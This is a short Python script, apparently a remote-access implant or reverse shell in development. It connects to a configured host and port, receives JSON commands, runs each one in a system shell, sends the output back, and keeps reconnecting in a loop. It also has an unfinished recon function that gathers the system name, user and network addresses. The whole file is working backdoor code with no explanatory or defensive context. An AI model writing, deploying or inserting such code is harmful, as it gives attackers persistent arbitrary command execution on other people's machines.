import socket,json,subprocess,struct,time
ip="127.0.0.1";pt=9000;rcndly=5;dbg=1
def log(x):print(f"[DBG] {x}")if dbg else None
def send(dta,ip,pt):
 try:
  log("send(): opening socket")
  s=socket.create_connection((ip,pt))
  s.sendall(struct.pack(">I",len(dta))+dta)
  log("send(): data sent")
  s.close()
 except Exception as e:log(f"send() ERR: {e}")
def Runcmd(cmd):
 log(f"Runcmd(): {cmd}")
 try:
  res=subprocess.run(cmd,shell=True,capture_output=True,text=True)
  return res.stdout+res.stderr
 except Exception as e:return f"Runcmd() ERR: {e}"
def recon():
 log("recon(): running")
 unm=Runcmd("uname -a")
 usr=Runcmd("whoami")
 ipa=Runcmd("ifconfig|grep inet")
def handle():
 try:
  log("handle(): connecting")
  s=socket.create_connection((ip,pt))
  log("handle(): connected")
  while 1:
   time.sleep(rcndly)
   try:
    l=s.recv(4)
    if not l:log("handle(): recv length=0");break
    ln=struct.unpack(">I",l)[0]
    log(f"handle(): expecting {ln} bytes")
    data=b''
    while len(data)<ln:
     chunk=s.recv(ln-len(data))
     if not chunk:log("handle(): recv chunk=0");break
     data+=chunk
    log(f"handle(): received {len(data)} bytes")
    try:
     cmd=json.loads(data.decode())["cmd"]
     log(f"handle(): cmd={cmd}")
     out=Runcmd(cmd)
     rsp=json.dumps({"output":out}).encode()
     send(rsp,ip,pt)
    except Exception as e:log(f"handle(): JSON/cmd ERR: {e}")
   except Exception as e:log(f"handle(): inner loop ERR: {e}")
  s.close();log("handle(): socket closed")
 except Exception as e:log(f"handle(): outer ERR: {e}")
if __name__=="__main__":
 while 1:
  try:handle()
  except Exception as e:log(f"main(): loop crash: {e}");time.sleep(1)
